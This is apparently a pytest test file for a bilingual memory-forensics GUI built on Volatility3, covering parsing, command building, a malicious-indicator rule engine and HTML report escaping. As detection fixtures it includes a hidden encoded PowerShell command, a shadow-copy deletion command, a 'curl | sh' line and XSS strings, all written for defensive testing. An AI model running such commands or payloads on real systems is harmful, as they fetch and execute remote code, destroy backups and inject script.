import json
import re
from pathlib import Path

import pytest

from forensic_gui import i18n
from forensic_gui.core import catalog, findings, runner
from forensic_gui.core.case import Case
from forensic_gui.core.hashing import hash_file, Cancelled
from forensic_gui.core.report import build_html_report
from forensic_gui.core.results import ParseError, parse_vol_json

ROOT = Path(__file__).resolve().parents[2]
PKG = Path(__file__).resolve().parents[1]


# ------------------------------------------------------------------ catalog
@pytest.mark.skipif(not (ROOT / "volatility3").is_dir(), reason="volatility3 tree not present")
def test_every_catalog_plugin_exists_in_install():
    assert catalog.missing_from_install(ROOT, [p.name for p in catalog.CATALOG]) == []


@pytest.mark.skipif(not (ROOT / "volatility3").is_dir(), reason="volatility3 tree not present")
def test_pid_flag_matches_real_plugin():
    base = catalog.plugins_root(ROOT)
    for p in catalog.CATALOG:
        mod = catalog._module_of(p.name).replace(".", "/") + ".py"
        src = (base / mod).read_text(encoding="utf-8")
        has_pid = 'name="pid"' in src
        assert has_pid == p.pid, f"{p.name}: catalog pid={p.pid} but plugin pid option={has_pid}"


def test_presets_reference_known_plugins():
    for key, preset in catalog.PRESETS.items():
        for name in preset["plugins"]:
            assert name in catalog.BY_NAME, f"{key}: {name}"


def test_catalog_has_bilingual_text():
    for p in catalog.CATALOG:
        assert p.title_en and p.title_ar and p.desc_en and p.desc_ar, p.name
        assert p.category in catalog.CATEGORIES


# ------------------------------------------------------------------ parsing
SAMPLE = """
[
  {"PID": 4, "PPID": 0, "ImageFileName": "System", "__children": [
      {"PID": 300, "PPID": 4, "ImageFileName": "smss.exe", "__children": []}]},
  {"PID": 700, "PPID": 4, "ImageFileName": "svchost.exe", "__children": []}
]
"""


def test_parse_tree_flattens_with_depth():
    t = parse_vol_json("\n" + SAMPLE, "windows.pstree")
    assert len(t) == 3 and t.tree
    assert [r["__depth"] for r in t.rows] == [0, 1, 0]
    assert t.columns[0] == "PID" and "__children" not in t.columns


@pytest.mark.parametrize("bad", ["", "   ", "no json here", "[{"])
def test_parse_errors(bad):
    with pytest.raises(ParseError):
        parse_vol_json(bad)


def test_parse_ignores_leading_log_noise_and_exports():
    t = parse_vol_json("WARNING something\n" + SAMPLE)
    assert len(t) == 3
    assert t.to_csv().splitlines()[0].startswith("PID")
    assert json.loads(t.to_json())[0]["PID"] == 4
    assert t.find("smss") == [1]


# ------------------------------------------------------------------ runner
def test_build_command_orders_global_args_before_plugin():
    cfg = runner.VolConfig(python="py", vol_path="/x/vol.py", symbol_dirs="/sym", offline=True, parallelism="threads")
    cmd = runner.build_command(cfg, "/img.raw", "windows.pslist", pids="4, 664", extra_args="--dump")
    assert cmd[:2] == ["py", "/x/vol.py"]
    assert cmd.index("-f") < cmd.index("windows.pslist") < cmd.index("--pid")
    assert cmd[cmd.index("--pid") + 1: cmd.index("--pid") + 3] == ["4", "664"]
    assert cmd[-1] == "--dump" and "--offline" in cmd and cmd[cmd.index("-r") + 1] == "json"


def test_installed_vol_executable_skips_python():
    cfg = runner.VolConfig(vol_path="/usr/bin/vol")
    assert runner.build_command(cfg, "i", "p")[0] == "/usr/bin/vol"


def test_progress_and_diagnosis():
    assert runner.parse_progress("\rProgress:  45.23\t\tScanning x\rProgress:  50.00\t\tScanning y") == (50.0, "Scanning y")
    assert runner.parse_progress("nothing") is None
    assert runner.diagnose("A symbol table requirement was not fulfilled", 1) == ["symbols"]
    assert runner.diagnose("", 0) == []
    assert runner.diagnose("boom", 2) == ["generic"]


# ------------------------------------------------------------------ findings
def _table(plugin, rows):
    t = parse_vol_json(json.dumps(rows), plugin)
    return t


def test_findings_end_to_end():
    pslist = _table("windows.pslist.PsList", [
        {"PID": 4, "PPID": 0, "ImageFileName": "System", "ExitTime": None},
        {"PID": 500, "PPID": 4, "ImageFileName": "wininit.exe", "ExitTime": None},
        {"PID": 510, "PPID": 4, "ImageFileName": "services.exe", "ExitTime": None},
        {"PID": 520, "PPID": 4, "ImageFileName": "lsass.exe", "ExitTime": None},
        {"PID": 521, "PPID": 4, "ImageFileName": "lsass.exe", "ExitTime": None},
        {"PID": 700, "PPID": 4, "ImageFileName": "svch0st.exe", "ExitTime": None},
        {"PID": 710, "PPID": 4, "ImageFileName": "svchost.exe", "ExitTime": None},
        {"PID": 800, "PPID": 4, "ImageFileName": "WINWORD.EXE", "ExitTime": None},
        {"PID": 801, "PPID": 800, "ImageFileName": "powershell.exe", "ExitTime": None},
    ])
    cmdline = _table("windows.cmdline.CmdLine", [
        {"PID": 801, "Process": "powershell.exe",
         "Args": "powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA"},
        {"PID": 900, "Process": "x.exe", "Args": "vssadmin delete shadows /all /quiet"},
        {"PID": 901, "Process": "ok.exe", "Args": "C:\\Windows\\System32\\notepad.exe"},
    ])
    malfind = _table("windows.malware.malfind.Malfind", [
        {"PID": 801, "Process": "powershell.exe", "Protection": "PAGE_EXECUTE_READWRITE",
         "Hexdump": "4d 5a 90 00", "Start VPN": "0x1", "End VPN": "0x2"},
        {"PID": 802, "Process": "x.exe", "Protection": "PAGE_EXECUTE_READWRITE", "Hexdump": "90 90"},
    ])
    net = _table("windows.netscan.NetScan", [
        {"Proto": "TCPv4", "ForeignAddr": "8.8.4.4", "ForeignPort": 443, "State": "ESTABLISHED",
         "Owner": "powershell.exe", "PID": 801},
        {"Proto": "TCPv4", "ForeignAddr": "10.0.0.5", "ForeignPort": 443, "State": "ESTABLISHED",
         "Owner": "powershell.exe", "PID": 801},
        {"Proto": "TCPv4", "ForeignAddr": "1.2.3.4", "ForeignPort": 4444, "State": "ESTABLISHED",
         "Owner": "chrome.exe", "PID": 1},
    ])
    out = findings.analyze({t.plugin: t for t in (pslist, cmdline, malfind, net)})
    rules = {(f.rule, f.pid) for f in out}
    assert ("masq_name", 700) in rules
    assert ("dup_single", 520) in rules and ("dup_single", 521) in rules
    assert ("bad_parent", 710) in rules
    assert ("office_child", 801) in rules
    assert ("ps_encoded", 801) in rules and ("ps_stealth", 801) in rules
    assert ("shadow_delete", 900) in rules
    assert ("malfind_pe", 801) in rules and ("malfind_rwx", 802) in rules
    assert ("net_external", 801) in rules and ("net_badport", 1) in rules
    assert not any(f.pid == 901 for f in out)
    assert not any(f.rule == "net_external" and "10.0.0.5" in f.evidence for f in out)  # private IP ignored
    sevs = [findings.SEV_RANK[f.severity] for f in out]
    assert sevs == sorted(sevs), "must be sorted by severity"


def test_exited_duplicates_and_benign_are_ignored():
    pslist = _table("windows.pslist.PsList", [
        {"PID": 520, "PPID": 4, "ImageFileName": "lsass.exe", "ExitTime": None},
        {"PID": 521, "PPID": 4, "ImageFileName": "lsass.exe", "ExitTime": "2024-01-01T00:00:00"},
    ])
    assert not [f for f in findings.analyze({pslist.plugin: pslist}) if f.rule == "dup_single"]


def test_hidden_process_via_psxview_and_linux_bash():
    psx = _table("windows.malware.psxview.PsXView", [
        {"Name": "evil.exe", "PID": 1337, "pslist": False, "psscan": True, "thrdscan": True, "csrss": False,
         "Exit Time": ""},
        {"Name": "ok.exe", "PID": 4, "pslist": True, "psscan": True, "thrdscan": True, "csrss": True},
    ])
    bash = _table("linux.bash.Bash", [{"PID": 9, "Process": "bash", "Command": "curl http://x.sh | sh"},
                                       {"PID": 9, "Process": "bash", "Command": "ls -la"}])
    hm = _table("linux.malware.hidden_modules.Hidden_modules", [{"Name": "diamorphine", "Address": "0x1"}])
    out = findings.analyze({t.plugin: t for t in (psx, bash, hm)})
    rules = {f.rule for f in out}
    assert {"hidden_proc", "linux_pipe_sh", "hidden_module"} <= rules
    assert [f.pid for f in out if f.rule == "hidden_proc"] == [1337]


def test_broken_rule_never_raises():
    weird = parse_vol_json('[{"PID": "abc", "ImageFileName": 5, "Args": null}]', "windows.pslist.PsList")
    findings.analyze({weird.plugin: weird})  # must not raise


# ------------------------------------------------------------------ hashing / case / report
def test_hashing_progress_and_cancel(tmp_path):
    f = tmp_path / "img.bin"
    f.write_bytes(b"abc" * 1000)
    seen = []
    h = hash_file(str(f), progress=lambda d, t: seen.append((d, t)))
    import hashlib
    assert h["sha256"] == hashlib.sha256(b"abc" * 1000).hexdigest() and seen[-1][0] == seen[-1][1]
    with pytest.raises(Cancelled):
        hash_file(str(f), cancelled=lambda: True)


def test_case_roundtrip_and_audit(tmp_path):
    c = Case(case_id="C-1", name="Test case", examiner="Ameer")
    c.folder = str(tmp_path / "case")
    c.save_result("windows.pslist", "[]")
    c.record_run("windows.pslist", "ok", 0, 1.2)
    c.audit("opened image")
    c.save()
    c2 = Case.load(c.folder)
    assert c2.name == "Test case" and "windows.pslist" in c2.saved_results()
    assert "opened image" in c2.audit_lines()[0]


def test_report_escapes_html_and_supports_rtl(tmp_path):
    c = Case(case_id="<script>alert(1)</script>", name="n", examiner="e")
    c.folder = str(tmp_path / "c")
    t = _table("windows.cmdline.CmdLine", [{"PID": 1, "Process": "<img src=x onerror=alert(1)>", "Args": "a"}])
    f = findings.Finding("ps_encoded", "high", t.plugin, "<b>ev</b>", "T1059.001", 1, "p")
    for lang in ("en", "ar"):
        i18n.set_language(lang)
        html = build_html_report(c, {t.plugin: t}, [f], lang=lang)
        assert "<script>alert" not in html and "<img src=x" not in html and "<b>ev</b>" not in html
        assert ('dir="rtl"' in html) == (lang == "ar")
    i18n.set_language("en")


# ------------------------------------------------------------------ i18n
def test_language_parity():
    assert set(i18n.EN) == set(i18n.AR), set(i18n.EN) ^ set(i18n.AR)
    for k, v in i18n.EN.items():
        assert v.strip() and i18n.AR[k].strip(), k
        # format placeholders must match across languages
        assert set(re.findall(r"{(\w+)}", v)) == set(re.findall(r"{(\w+)}", i18n.AR[k])), k


def test_every_rule_has_text():
    for rid in {f.rule for f in [] } | set(i18n.RULES_EN):
        assert f"rule.{rid}.title" in i18n.EN
    used = set(re.findall(r'Finding\("(\w+)"|\(\s*"(\w+)",\s*(?:re\.compile|"(?:critical|high|medium|low)")', (PKG / "core" / "findings.py").read_text()))
    ids = {a or b for a, b in used}
    # ROW_RULES + CMD rules + inline rules must all be translatable
    src = (PKG / "core" / "findings.py").read_text()
    row_ids = set(re.findall(r'\("(\w+)", "(?:critical|high|medium|low)", "T\d', src))
    for rid in ids | row_ids:
        assert f"rule.{rid}.title" in i18n.EN, rid


def test_all_tr_keys_used_in_source_exist():
    keys = set()
    for py in PKG.rglob("*.py"):
        if "tests" in py.parts or py.name == "i18n.py":
            continue
        keys |= set(re.findall(r'\btr\(\s*"([a-z_]+\.[a-z_]+)"', py.read_text(encoding="utf-8")))
    missing = {k for k in keys if k not in i18n.EN}
    assert not missing, missing
